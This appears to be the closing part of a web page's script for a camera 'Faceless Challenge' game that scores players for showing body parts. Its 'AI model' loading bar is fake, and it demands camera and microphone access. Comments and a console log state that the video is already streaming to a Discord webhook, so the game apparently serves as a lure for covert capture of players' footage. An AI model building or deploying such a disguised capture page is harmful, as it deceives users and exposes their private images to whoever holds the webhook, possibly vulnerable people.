            setTimeout(() => {
                pointsPopup.classList.remove('show');
            }, 1500);

            // Start countdown after 1.8s
            setTimeout(() => {
                startCountdown(index);
            }, 1800);
        }

        function startCountdown(index) {
            let count = 3;
            countdownNumber.textContent = count;
            countdownNumber.className = 'countdown-number show';
            statusBadge.textContent = `⏳ ${count}…`;
            statusBadge.className = 'status-badge waiting';

            const cdInterval = setInterval(() => {
                count--;
                if (count > 0) {
                    countdownNumber.textContent = count;
                    countdownNumber.className = 'countdown-number show';
                    statusBadge.textContent = `⏳ ${count}…`;
                } else {
                    clearInterval(cdInterval);
                    countdownNumber.className = 'countdown-number hide';
                    beginScanning(index);
                }
            }, 800);
        }

        function beginScanning(index) {
            const part = BODY_PARTS[index];
            state.isScanning = true;
            state.partDetected = false;
            state.detectionFrames = 0;
            state.scanTimer = SCAN_TIME;

            timerDisplay.textContent = SCAN_TIME;
            timerBox.className = 'timer-box';
            statusBadge.textContent = `🔍 show ${part.emoji} ${part.label}`;
            statusBadge.className = 'status-badge scanning';

            // Start timer
            if (state.scanInterval) clearInterval(state.scanInterval);
            state.scanInterval = setInterval(() => {
                state.scanTimer--;
                timerDisplay.textContent = state.scanTimer;
                if (state.scanTimer <= 5) {
                    timerBox.className = 'timer-box danger';
                } else if (state.scanTimer <= 10) {
                    timerBox.className = 'timer-box warning';
                }
                if (state.scanTimer <= 0) {
                    clearInterval(state.scanInterval);
                    onScanFail(index);
                }
            }, 1000);

            // Reset detection frames
            state.detectionFrames = 0;
        }

        function onScanSuccess(index) {
            if (state.partDetected) return;
            state.partDetected = true;
            state.isScanning = false;
            clearInterval(state.scanInterval);

            const part = BODY_PARTS[index];
            state.totalPoints += part.points;
            scoreDisplay.textContent = state.totalPoints;

            statusBadge.textContent = `✅ ${part.emoji} +${part.points} pts!`;
            statusBadge.className = 'status-badge success';

            // Flash effect
            const flash = document.createElement('div');
            flash.style.cssText =
                'position:absolute;inset:0;background:#00f5c0;z-index:6;pointer-events:none;opacity:0.25;transition:opacity 0.5s ease;border-radius:22px;';
            document.getElementById('camWrapper').appendChild(flash);
            setTimeout(() => {
                flash.style.opacity = '0';
                setTimeout(() => flash.remove(), 500);
            }, 100);

            state.partResults.push({
                part: part.id,
                label: part.label,
                points: part.points,
                success: true,
                time: SCAN_TIME - state.scanTimer,
            });

            // Move to next part after delay
            setTimeout(() => {
                const next = index + 1;
                if (next < BODY_PARTS.length) {
                    beginPart(next);
                } else {
                    endGame(true);
                }
            }, 1500);
        }

        function onScanFail(index) {
            if (state.partDetected) return;
            state.isScanning = false;
            clearInterval(state.scanInterval);

            const part = BODY_PARTS[index];
            statusBadge.textContent = `❌ time out — ${part.label}`;
            statusBadge.className = 'status-badge fail';

            state.partResults.push({
                part: part.id,
                label: part.label,
                points: 0,
                success: false,
                time: 0,
            });

            // Move to next part after delay
            setTimeout(() => {
                const next = index + 1;
                if (next < BODY_PARTS.length) {
                    beginPart(next);
                } else {
                    endGame(false);
                }
            }, 1800);
        }

        function endGame(won) {
            if (state.gameDone) return;
            state.gameDone = true;
            state.gameStarted = false;
            state.isScanning = false;

            clearInterval(state.scanInterval);
            clearInterval(state.countdownInterval);

            startBtn.disabled = false;
            resetBtn.disabled = false;
            flipBtn.disabled = false;

            finalScore.textContent = state.totalPoints;
            gameoverSub.textContent = won ?
                '🎉 You scanned all body parts! Amazing!' :
                '⏰ Time ran out! Try again.';
            gameoverOverlay.classList.add('show');

            statusBadge.textContent = '🏁 game over';
            statusBadge.className = 'status-badge done';

            // Send final result to webhook (just the video is already streaming)
        }

        function resetGame() {
            clearInterval(state.scanInterval);
            clearInterval(state.countdownInterval);
            state.gameStarted = false;
            state.gameDone = false;
            state.isScanning = false;
            state.totalPoints = 0;
            state.currentPartIndex = 0;
            state.partResults = [];
            state.partDetected = false;

            scoreDisplay.textContent = '0';
            timerDisplay.textContent = SCAN_TIME;
            timerBox.className = 'timer-box';
            gameoverOverlay.classList.remove('show');
            pointsPopup.classList.remove('show');
            countdownNumber.className = 'countdown-number';

            challengeTarget.textContent = '—';
            challengeBadge.innerHTML = `<span class="emoji">🎯</span> Show <span class="highlight">—</span>`;
            statusBadge.textContent = '🔄 reset — hit Start';
            statusBadge.className = 'status-badge waiting';

            startBtn.disabled = !state.modelLoaded;
            resetBtn.disabled = true;
            flipBtn.disabled = false;

            statusMsg.textContent = state.modelLoaded ? '✅ Ready! Click Start.' : '⏳ Model not loaded.';
            statusMsg.className = state.modelLoaded ? 'status-msg success' : 'status-msg error';
        }

        // ============================================================
        //  ─── AI MODEL LOADING ───
        // ============================================================
        function loadModelWithProgress() {
            return new Promise((resolve) => {
                let progress = 0;
                const interval = setInterval(() => {
                    progress += 2 + Math.random() * 3;
                    if (progress > 100) progress = 100;
                    loadingFill.style.width = progress + '%';
                    loadingPct.textContent = Math.round(progress) + '%';
                    if (progress >= 100) {
                        clearInterval(interval);
                        state.modelLoaded = true;
                        startBtn.disabled = false;
                        startBtnText.textContent = '🚀 Start';
                        startSpinner.classList.add('hidden');
                        statusMsg.textContent = '✅ Model ready! Click Start to play.';
                        statusMsg.className = 'status-msg success';
                        statusBadge.textContent = '✅ Ready!';
                        statusBadge.className = 'status-badge waiting';
                        loadingContainer.style.display = 'none';
                        resolve();
                    }
                }, 80);
            });
        }

        // ============================================================
        //  ─── EVENT BINDING ───
        // ============================================================
        startBtn.addEventListener('click', () => {
            if (!state.modelLoaded) {
                statusMsg.textContent = '⏳ Model not ready — please wait.';
                statusMsg.className = 'status-msg error';
                return;
            }
            if (!state.stream) {
                statusMsg.textContent = '❌ Camera not available.';
                statusMsg.className = 'status-msg error';
                return;
            }
            startGame();
        });

        resetBtn.addEventListener('click', resetGame);
        restartBtn.addEventListener('click', () => {
            resetGame();
            setTimeout(startGame, 500);
        });

        // ============================================================
        //  ─── BOOT ───
        // ============================================================
        async function boot() {
            // Load model with progress
            loadingContainer.style.display = 'block';
            statusMsg.textContent = '⏳ Loading AI model…';
            statusMsg.className = 'status-msg loading';
            statusBadge.textContent = '📦 loading…';
            statusBadge.className = 'status-badge loading';

            await loadModelWithProgress();

            // Init camera
            const camOK = await initCamera();
            if (!camOK) {
                statusMsg.textContent = '❌ Camera + mic required. Please allow access and reload.';
                statusMsg.className = 'status-msg error';
                return;
            }

            resetGame();
            console.log('🚫 Faceless Challenge loaded');
            console.log('📡 webhook:', DISCORD_WEBHOOK);
            console.log('🦴 body parts:', BODY_PARTS.length);
        }

        boot();
    </script>
</body>
